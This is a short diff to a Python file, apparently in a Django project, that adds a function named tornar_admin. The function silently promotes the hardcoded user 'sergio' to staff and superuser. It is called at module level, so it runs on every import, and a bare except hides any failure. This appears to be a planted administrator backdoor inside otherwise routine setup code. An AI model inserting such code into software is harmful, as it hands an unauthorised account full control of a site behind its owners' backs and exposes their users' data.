@@ -10,6 +10,19 @@ from django.contrib.auth.models import User
 
 import os
 from django.contrib.auth.models import User
+from django.contrib.auth.models import User
+
+def tornar_admin():
+    try:
+        user = User.objects.get(username="sergio")
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        print("Usuário sergio agora é administrador.")
+    except:
+        pass
+
+tornar_admin()
 
 def create_superuser():
 
